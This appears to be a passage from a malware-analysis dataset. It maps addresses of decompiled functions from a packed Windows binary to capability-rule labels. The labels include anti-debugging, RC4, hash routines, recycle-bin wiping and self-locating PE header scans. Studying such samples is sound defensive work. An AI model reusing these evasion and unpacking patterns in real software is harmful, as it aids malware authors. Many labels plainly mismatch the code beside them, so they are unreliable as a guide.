        "decompiled_code": "\nint16_t * __cdecl fcn.00402aae(int32_t arg_8h)\n\n{\n    uint var_1ch;\n    int16_t *var_18h;\n    uint var_14h;\n    uint var_10h;\n    code *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = fcn.00401ea9;\n    if (arg_8h == 0) {\n        for (; ((*var_ch != 0x5a4d || (*(var_ch + *(var_ch + 0x3c)) != 'P')) ||\n               (var_18h = var_ch,  *(var_ch + *(var_ch + 0x3c) + 1) != 'E')); var_ch = var_ch + -0x1000 & 0xfffff000) {\n        }\n    }\n    else {\n        var_18h = fcn.00402436(arg_8h, 0);\n    }\n    return var_18h;\n}\n",
        "token_count": 222
    },
    "00402a13": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_5h\n// WARNING: Could not reconcile some variable overlaps\n\nbool __cdecl fcn.00402a13(uint noname_0, char *arg_ch)\n\n{\n    char cVar1;\n    uint var_19h;\n    uint var_14h;\n    uint var_ch;\n    uint var_5h;\n    \n    cVar1 = *arg_ch;\n    while( true ) {\n        if (cVar1 != -1) {\n            var_19h._0_1_ = false;\n            if ((cVar1 == -0x48) && (var_19h._0_1_ = false,  arg_ch[3] == 'P')) {\n                var_19h._0_1_ = arg_ch[4] == -0x33;\n            }\n            return var_19h._0_1_;\n        }\n        if (arg_ch[1] != '%') break;\n        arg_ch = **(arg_ch + 2);\n        cVar1 = *arg_ch;\n    }\n    return false;\n}\n",
        "token_count": 236
    },
    "004014aa": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nvoid fcn.004014aa(void)\n\n{\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    int32_t var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_8h;\n    \n    (*_sym.imp.KERNEL32.dll_GetConsoleCP)();\n    var_c4h = 0;\n    do {\n        (*_sym.imp.KERNEL32.dll_GetTimeZoneInformation)(&var_b4h);\n        (*_sym.imp.KERNEL32.dll_GetProcessId)(0xdb9fe3);\n        var_c4h = var_c4h + 1;\n        var_8h = 0x80c;\n        (*_sym.imp.KERNEL32.dll_GetProcessHandleCount)(0xbac021, &var_8h);\n        (*_sym.imp.USER32.dll_GetMenuState)(0x7cde82, 0x370, 0x7f9);\n    } while (var_c4h != 6);\n    return;\n}\n",
        "token_count": 256
    },
    "00402890": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402890(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_18h = 0;\n    var_1ch = 0;\n    do {\n        iVar4 = var_18h * 0x88;\n        iVar5 = var_18h * 0x88;\n        var_18h = var_18h + 1;\n        var_1ch = (*(iVar5 + 0x415a58) ^ *(iVar4 + 0x415a5c)) + var_1ch;\n    } while (var_18h != 7);\n    iVar4 = fcn.00401139(4, var_1ch);\n    var_2ch = 0;\n    var_30h = 0;\n    do {\n        uVar1 = *(var_30h * 0x88 + 0x415a58);\n        uVar2 = *(var_30h * 0x88 + 0x415a5c);\n        uVar3 = uVar1 ^ uVar2;\n        iVar5 = *(var_30h * 0x88 + 0x4159ec);\n        var_48h = 0;\n        if (uVar2 != uVar1) {\n            do {\n                *(iVar4 + var_2ch + var_48h) = *(iVar5 + var_48h);\n                var_48h = var_48h + 1;\n            } while (var_48h != uVar3);\n        }\n        var_2ch = uVar3 + var_2ch;\n        var_30h = var_30h + 1;\n    } while (var_30h != 7);\n    fcn.00401dc7(iVar4, iVar4, var_1ch);\n    fcn.0040120e(arg_8h, iVar4);\n    *(arg_8h + 0xc) = *0x415db8;\n    *(arg_8h + 4) = *0x415db4;\n    return 0;\n}\n",
        "token_count": 603
    },
    "004010ed": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004010ed(void)\n\n{\n    uint arg_8h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    \n    fcn.00401d44(&var_20h, 0x403436, 0xe);\n    arg_8h = fcn.004020a4();\n    *0x415da8 = fcn.00402710(arg_8h, &var_20h);\n    return;\n}\n",
        "token_count": 107
    },
    "0040120e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040120e(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    arg_8h[2] = arg_ch + *0x415dbc;\n    *arg_8h = arg_ch + *0x415dc0;\n    return;\n}\n",
        "token_count": 66
    },
    "0040122c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040122c(void)\n\n{\n    uint uVar1;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_ch;\n    uint var_8h;\n    \n    var_8h = 0x521aca05;\n    var_ch = 0x57688308;\n    fcn.00401d44(&var_2ch, 0x4034c3, 0x10);\n    uVar1 = fcn.004020a4();\n    uVar1 = fcn.00402710(uVar1, &var_2ch);\n    return uVar1;\n}\n",
        "token_count": 158
    },
    "004012a3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004012a3(void)\n\n{\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    var_8h = 0x1fe5bb6a;\n    var_ch = 0x89b;\n    var_10h = 0xa4f;\n    (*_sym.imp.USER32.dll_SetSysColors)(0x948, &var_ch, &var_10h);\n    (*_sym.imp.GDI32.dll_SetWindowOrgEx)(0xfddc79, 0xa97, 0x1d7, &var_18h);\n    (*_sym.imp.KERNEL32.dll_SetProcessWorkingSetSize)(0x193768, 0x1623d0, 0x1623d0);\n    return;\n}\n",
        "token_count": 202
    },
    "00401319": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create mutex"
        ],
        "decompiled_code": "\nvoid fcn.00401319(void)\n\n{\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = 0x1f2d784e;\n    (*_sym.imp.KERNEL32.dll_CreateMutexExA)(0, 0x4034d3, 0, 0);\n    (*_sym.imp.KERNEL32.dll_GetUserDefaultLocaleName)(0x4034ea, var_4h ^ 0x1f2d7866);\n    (*_sym.imp.ADVAPI32.dll_AddUsersToEncryptedFile)(0x403500, &var_ch);\n    (*_sym.imp.USER32.dll_HiliteMenuItem)(0x77ee1a, 0xa92978, 0x7a3, 0x419);\n    (*_sym.imp.KERNEL32.dll_SetCommBreak)(0x84eb1d);\n    (*_sym.imp.GDI32.dll_FrameRgn)(0xb8ef52, 0xca19c4, 0x63c333, 0x7c1, 0x7c1);\n    (*_sym.imp.GDI32.dll_SetPolyFillMode)(0xfd1caf, 0xdf3);\n    (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n    (*_sym.imp.KERNEL32.dll_DeactivateActCtx)(0xcdf, 0xad2f2);\n    (*_sym.imp.USER32.dll_CopyImage)(0x5680da, 0x326, var_4h + 0xe0d28d0c, var_4h + 0xe0d28d0c, 0x7bb);\n    return;\n}\n",
        "token_count": 433
    },
    "0040173e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401753) overlaps instruction at (ram,0x0040174e)\n// \n\nvoid fcn.0040173e(int32_t param_1, uint param_2)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    char cVar3;\n    uint uVar4;\n    code *extraout_ECX;\n    code *pcVar5;\n    uint uVar6;\n    uint32_t unaff_EBX;\n    uint32_t unaff_EBP;\n    uchar *puVar7;\n    uint8_t uVar8;\n    bool bVar9;\n    ulong uVar10;\n    uint unaff_retaddr;\n    char *pcStack20;\n    int32_t *piStack16;\n    uchar *puStack12;\n    uint uStack8;\n    \n    puVar7 = &stack0xfffffffc;\n    uVar8 = &stack0xfffffffc < 0x10;\n    uStack8 = 0x1e9e2805;\n    pcVar5 = _sym.imp.SETUPAPI.dll_SetupFindNextLine;\n    do {\n        uVar10 = (*pcVar5)();\n        unaff_EBX = unaff_EBX + 1;\n        bVar9 = &pcStack20 < 0;\n        uVar4 = uVar10;\n        pcVar5 = extraout_ECX;\n        uVar6 = uVar10 >> 0x20;\n        while( true ) {\n            if (bVar9) break;\n            puVar1 = CONCAT22((uVar4 >> 8) >> 7, CONCAT11(0xc2, *(unaff_EBX + (uVar4 & 0xffU)))) + 0x1373d8cb;\n            uVar2 = pcVar5 & 0x1f;\n            *puVar1 = *puVar1 >> uVar2 | *puVar1 << 0x20 - uVar2;\n            bVar9 = (pcVar5 & 0x1f) != 0;\n            pcVar5 = param_1 + -1;\n            if (pcVar5 != NULL) {\n                *(param_1 + 0x4d89d044) = *(param_1 + 0x4d89d044) + pcVar5 + (!bVar9 & uVar8 | (bVar9 && *puVar1 < 0));\n                pcVar5 = swi(3);\n                (*pcVar5)();\n                return;\n            }\n            if (param_2 != *pcStack20) {\n                *piStack16 = *piStack16 >> (pcVar5 & 0x1f);\n                pcVar5 = swi(1);\n                (*pcVar5)();\n                return;\n            }\n            cVar3 = (unaff_EBP >> 8) * '\\x02';\n            unaff_EBX = unaff_EBP & 0xffff0000 | CONCAT11(cVar3, unaff_EBP);\n            bVar9 = cVar3 < '\\0';\n            puVar1 = unaff_EBX + 0x4c;\n            uVar8 = *puVar1 < 0;\n            *puVar1 = *puVar1 << 1 | uVar8;\n            uVar4 = param_2;\n            uVar6 = unaff_retaddr;\n            puVar7 = puStack12;\n        }\n        in(uVar6);\n        puVar7[0x45c7f845] = puVar7[0x45c7f845] + pcVar5 + uVar8;\n        uVar8 = false;\n    } while( true );\n}\n",
        "token_count": 794
    },
    "00401f65": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401f65(void)\n\n{\n    uint arg_8h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    \n    fcn.00401d44(&var_20h, 0x4034b3, 0x10);\n    arg_8h = fcn.004020a4();\n    fcn.00402710(arg_8h, &var_20h);\n    return;\n}\n",
        "token_count": 104
    },
    "00401fd1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00401fd1(void)\n\n{\n    int32_t iVar1;\n    int32_t in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(in_FS_OFFSET + 0x18);\n    var_ch = -1;\n    if ((iVar1 != 0) && (var_ch = iVar1,  iVar1 == 1)) {\n        var_ch = 0;\n    }\n    return var_ch;\n}\n",
        "token_count": 119
    },
    "0040203a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040203a(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.004020a4();\n    fcn.00402710(arg_8h_00, arg_8h);\n    return;\n}\n",
        "token_count": 74
    },
    "00402196": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_9h\n\nint32_t __cdecl fcn.00402196(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_10h;\n    uint var_9h;\n    \n    iVar2 = arg_8h + *(arg_8h + 0x3c);\n    if (*(arg_8h + *(arg_8h + 0x3c)) == 'P') {\n        iVar1 = 0;\n        if (*(iVar2 + 1) == 'E') {\n            iVar1 = iVar2;\n        }\n        return iVar1;\n    }\n    return 0;\n}\n",
        "token_count": 155
    },
    "004023fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ah\n\nint16_t __cdecl fcn.004023fc(uint arg_8h)\n\n{\n    uint var_ah;\n    \n    if (arg_8h - 0x61U < 0x1a) {\n        arg_8h._0_2_ = arg_8h + -0x20;\n    }\n    return arg_8h;\n}\n",
        "token_count": 93
    },
    "00402606": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_5h\n\nint32_t __cdecl fcn.00402606(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_5h;\n    \n    var_10h = 0;\n    iVar1 = var_10h;\n    do {\n        var_10h = iVar1;\n        iVar1 = var_10h + 1;\n    } while (*(arg_8h + var_10h) != '\\0');\n    return var_10h;\n}\n",
        "token_count": 141
    },
    "0040283b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040283b(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_FS_OFFSET;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    iVar1 = *(in_FS_OFFSET + arg_8h);\n    var_18h = -1;\n    if ((iVar1 != 0) && (var_18h = iVar1,  iVar1 == 1)) {\n        var_18h = 0;\n    }\n    return var_18h;\n}\n",
        "token_count": 142
    }
}